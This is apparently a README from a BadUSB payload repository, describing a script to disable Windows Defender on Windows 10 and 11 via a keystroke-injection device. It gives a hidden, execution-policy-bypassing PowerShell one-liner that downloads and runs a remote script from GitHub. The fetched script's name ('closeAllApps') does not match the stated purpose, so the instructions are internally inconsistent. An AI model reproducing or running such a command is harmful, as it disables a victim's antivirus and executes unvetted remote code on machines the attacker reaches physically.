# Disable Defender - BadUSB ✅

A script used to disable Windows Defender.

**Category**: Execution

<div align=center>

<img src="/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

A script used to disable Windows Defender.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Opens app searcher, search for `windows defender\seguridad de windows` (Must be change depending on Locale)
* Execute command to disable Windows defender on directory C:\

All
```powershell
powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1').Content"
```
